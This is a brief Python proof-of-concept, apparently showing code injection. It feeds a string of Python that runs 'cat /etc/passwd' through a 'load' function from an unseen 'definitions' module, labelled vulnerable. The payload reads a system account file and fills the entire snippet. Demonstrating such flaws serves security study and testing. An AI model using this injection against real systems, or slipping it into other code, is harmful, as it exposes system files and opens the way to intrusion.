from definitions import load

def vulnerable_load(input_data):
    return load(input_data)

malicious_input = """
import os
os.system('cat /etc/passwd')
"""

vulnerable_load(malicious_input)